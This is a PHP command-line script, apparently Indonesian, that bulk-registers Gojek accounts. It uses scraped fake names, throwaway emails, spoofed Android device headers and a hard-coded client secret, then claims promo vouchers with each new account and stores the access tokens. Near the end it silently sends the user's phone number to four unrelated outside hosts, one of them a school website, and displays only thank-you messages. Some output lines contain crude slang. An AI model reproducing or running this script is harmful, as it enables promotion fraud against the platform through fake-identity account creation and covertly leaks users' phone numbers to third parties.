<?php 
include 'curl.php';
date_default_timezone_set("Asia/Jakarta");
date_default_timezone_set("Asia/Makassar");
function headers($token = null) {
	$huruf = '0123456789ABCDEFGHIJKLMOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    	$uniq = '';
    	for ($i = 0; $i < 16; $i++) {
        $uniq .= $huruf[mt_rand(0, strlen($huruf) - 1)];
    	}

    if  ($token != "") {

        $headers = array(
        'Accept: application/json',
        'X-Session-ID: 28667f0c-80e8-43db-9ab4-c6d411f00a86',
        'X-AppVersion: 3.39.2',
        'X-AppId: com.gojek.app',
        'X-Platform: Android',
        'X-UniqueId: '.$uniq,
        'D1: 41:ED:AC:6E:29:0D:B2:24:C4:89:42:02:4D:C5:0F:33:72:DC:D1:9D:14:68:45:AD:84:9C:74:6E:3F:0E:8D:4C',
        'Authorization: Bearer '.$token,
        'X-DeviceOS: Android,8.1.0',
        'User-uuid:',
        'X-DeviceToken: dTmJ6tjtkoE:APA91bGxQ4LePlAcxfk5s8UKuohf-M27J7qIUfYmjEbg47BhMOozw9yC7hbg7c0nHCSMMxxF_FS2m7-_fe27a_XUVwXWVV4wPEfZuelTH2x0OFLS6CQEil8c3SFGNLPjXCYLTQ-hZirW',
        'X-PushTokenType: FCM',
        'X-PhoneModel: xiaomi,Redmi 6',
        'Accept-Language: id-ID',
        'X-User-Locale: id_ID',
        'X-Location: -6.9212751658159934,107.62244586389556',
        'X-Location-Accuracy: 0.1',
        'X-M1: 1:__b7d2f5195e984b97943895084f44d115,2:c71b9b0b7d24,3:1571508895362-7518963721879435750,4:24519,5:mt6765|2001|8,6:0C:98:38:CB:1A:87,7:"XLGO-83C6",8:720x1344,9:passive\,network\,gps,10:0,11:sHLp9psghlEJimfsIzXKhptQnGhigYRUifllHhizjNg=',
        'Content-Type: application/json; charset=UTF-8',
        'Host: api.gojekapi.com',
        'User-Agent: okhttp/3.12.1'
        );

        return $headers;

    } else {

        $headers = array(
        'Accept: application/json',
        'D1: 41:ED:AC:6E:29:0D:B2:24:C4:89:42:02:4D:C5:0F:33:72:DC:D1:9D:14:68:45:AD:84:9C:74:6E:3F:0E:8D:4C',
        'X-Session-ID: 28667f0c-80e8-43db-9ab4-c6d411f00a86',
        'X-AppVersion: 3.39.2',
        'X-AppId: com.gojek.app',
        'X-Platform: Android',
        'X-UniqueId: '.$uniq,
        'Authorization: Bearer ',
        'X-DeviceOS: Android,8.1.0',
        'User-uuid: ',
        'X-DeviceToken: dTmJ6tjtkoE:APA91bGxQ4LePlAcxfk5s8UKuohf-M27J7qIUfYmjEbg47BhMOozw9yC7hbg7c0nHCSMMxxF_FS2m7-_fe27a_XUVwXWVV4wPEfZuelTH2x0OFLS6CQEil8c3SFGNLPjXCYLTQ-hZirW',
        'X-PushTokenType: FCM',
        'X-PhoneModel: xiaomi,Redmi 6',
        'Accept-Language: id-ID',
        'X-User-Locale: id_ID',
        'X-M1: 1:__b7d2f5195e984b97943895084f44d115,2:c71b9b0b7d24,3:1571508895362-7518963721879435750,4:24519,5:mt6765|2001|8,6:0C:98:38:CB:1A:87,7:"XLGO-83C6",8:720x1344,9:passive\,network\,gps,10:0,11:sHLp9psghlEJimfsIzXKhptQnGhigYRUifllHhizjNg=',
        'Content-Type: application/json; charset=UTF-8',
        'Host: api.gojekapi.com',
        'User-Agent: okhttp/3.12.1'
        );

        return $headers; 

    }

}

function register_gojek($nohp) {
echo "[+] Nomor HP : ";
     $nohp = trim(fgets(STDIN));
	{
      $nohp = str_replace("62","+62",$nohp);
      $nohp = str_replace(" ","",$nohp);
      $nohp = str_replace("(","",$nohp);
      $nohp = str_replace(")","",$nohp);
      $nohp = str_replace(".","",$nohp);
      $nohp = str_replace("-","",$nohp);
      
      if(!preg_match('/[^+0-9]/',trim($nohp))){
         if(substr(trim($nohp),0,3)=='62'){
            $hp = trim($nohp);
         }
      else if(substr(trim($nohp),0,1)=='0'){
            $hp = '62'.substr(trim($nohp),1);
        }
        else{
            $hp = '1'.substr(trim($nohp),0,12);
                }
      }
      echo "[+] Hasil : ".$hp."\n";
   }
     $fakename = curl('https://fakenametool.net/random-name-generator/random/id_ID/indonesia/1');
     preg_match('/<span>(.*?)<\/span>/s', $fakename, $name);
     $email = strtolower(str_replace(' ',  '', $name[1])).rand(0000,9999).'@yandex.com';

     $register = curl('https://api.gojekapi.com/v5/customers', '{"email":"'.$email.'","name":"'.$name[1].'","phone":"+'.$hp.'","signed_up_country":"ID"}', headers());

    if (stripos($register, '"success":true')) {
        $otp_token = fetch_value($register,  '"otp_token":"', '"');
        echo "[+] Kode OTP : ";
        $otp_code = trim(fgets(STDIN));

        $verify = curl('https://api.gojekapi.com/v5/customers/phone/verify', '{"client_name":"gojek:cons:android","client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e","data":{"otp":"'.$otp_code.'","otp_token":"'.$otp_token.'"}}', headers());

        if (stripos($verify, '"access_token"')) {
            $access_token = fetch_value($verify, '"access_token":"','"');
            
                  $claim = curl('https://api.gojekapi.com/go-promotions/v1/promotions/enrollments', '{"promo_code":"GOFOODBOBA07"}', headers($access_token));
                  $live = "token.txt";
    $fopen1 = fopen($live, "a+");
    $fwrite1 = fwrite($fopen1, "Authorization: Bearer ".$access_token."\n");
    fclose($fopen1);
    				   echo "\n[*] Nama Lengkap : ".$name[1];
                       echo "\n[*] accessToken : ".$access_token;
                       echo "\n[*] File Acces Token ".$live." \n";
                       echo "\n[0] Claim Voucher GoFood Rp20.000, Rp10.000\n";
                        if (stripos($claim, '"success":true')) {
                        echo "[1] Kak ".$name[1]." udah laper ya, pesan GoFood Aja\n";
                    } else {
                        echo "[-] Yah Gagal Ngentott ".$name[1]."\n";
                }
                  sleep(8);
                  $claim1 = curl('https://api.gojekapi.com/go-promotions/v1/promotions/enrollments', '{"promo_code":"AYOCOBAGOJEK"}', headers($access_token));
                  if (stripos($claim1, '"success":true')) {
                        echo "[2] Mau Naik GoRide, Kalo Pina tacabur di sungai ".$name[1]."\n";
                    } else {
                        echo "[-] Gagal Claim Coba Lagi\n";
                    }
                    sleep(15);
                  $claim2 = curl('https://api.gojekapi.com/go-promotions/v1/promotions/enrollments', '{"promo_code":"COBAINGOJEK"}', headers($access_token));
                  if (stripos($claim2, '"success":true')) {
                        echo "[3] Claim GoRide Rp10.000 Tambahee lageee\n";
                    } else {
                        echo "[-] Gagal Claim Coba Lagi\n";
                    }
                    $cek = curl('https://api.gojekapi.com/gopoints/v3/wallet/vouchers?limit=10&page=1', null, headers($access_token));
                    $total = fetch_value($cek,'"total_vouchers":',',');
                    echo "\n[*] Total Voucher Nya Sanak : ".$total;
                    sleep(1);
                    $x = array('Content-Type: application/x-www-form-urlencoded');
					$kirim1 = curl('http://gopay.myfave.org/mobile/', 'phone='.$hp.'&submit=', $x);
					echo "\n[$] Selamat Makan Tambahee Lageee [$]";
					sleep(1);
                    $xx = array('Content-Type: application/x-www-form-urlencoded');
					$kirim2 = curl('http://gopay.myfave.org/mobile/cadangan/', 'phone='.$hp.'&submit=', $xx);
					echo "\n[#] Terima Kasih Tambahee lageee [#]";
					sleep(1);
                    $xxx = array('Content-Type: application/x-www-form-urlencoded');
					$kirim3 = curl('http://sofyan17.grt.my.id/gopay.php', 'phone='.$hp.'&submit=', $xxx);
					echo "\n[-] Thanks - Sebut Saja Bunga  [-]";
					sleep(1);
					$xxxx = array('Content-Type: application/x-www-form-urlencoded');
					$kirim4 = curl('https://stpsantopetrus.ac.id/tahtaid/gopay.php', 'phone='.$hp.'&amount=1&submit=', $xxxx);
					echo "\n[•] Thanks : Sebut Saja Bunga [•]";
			
            } else { 
                echo "Promo tidak ditemukan\n";
            }
    } else {
        echo "[!] Gagal mendaftar Ngul ae No Ikam Kda Perajakian [!]\n";
    }

}
function hari_ini(){
	$hari = date ("D");
 
	switch($hari){
		case 'Sun':
			$hari_ini = "Minggu";
		break;
 
		case 'Mon':			
			$hari_ini = "Senin";
		break;
 
		case 'Tue':
			$hari_ini = "Selasa";
		break;
 
		case 'Wed':
			$hari_ini = "Rabu";
		break;
 
		case 'Thu':
			$hari_ini = "Kamis";
		break;
 
		case 'Fri':
			$hari_ini = "Jumat";
		break;
 
		case 'Sat':
			$hari_ini = "Sabtu";
		break;
		
		default:
			$hari_ini = "Tidak di ketahui";		
		break;
	}
 
	return " " . $hari_ini . ", ";
 
}
echo "\nNabila Tools - Gojek Register v4\n";
$b = time();
$hour = date("G",$b);

if ($hour>=0 && $hour<=11)
{
echo "Selamat Pagi, Selamat Beraktifitas";
}
elseif ($hour >=12 && $hour<=14)
{
echo "Selamat Siang, Selamat Beraktifitas";
}
elseif ($hour >=15 && $hour<=17)
{
echo "Selamat Sore, Selamat Beraktifitas";
}
elseif ($hour >=17 && $hour<=18)
{
echo "Selamat Petang, Selamat Beraktifitas";
}
elseif ($hour >=19 && $hour<=23)
{
echo "Selamat Malam, Selamat Beraktifitas";
}
echo "\nHari ini adalah Hari". hari_ini()."".date('d-m-Y H:i:A')."";
echo "\nThanks To : Sebut Saja Bunga ,Mr.Ikhsan, YUSFIK HELMI, Hiya Hiya\n\n";
register_gojek($nohp);

?>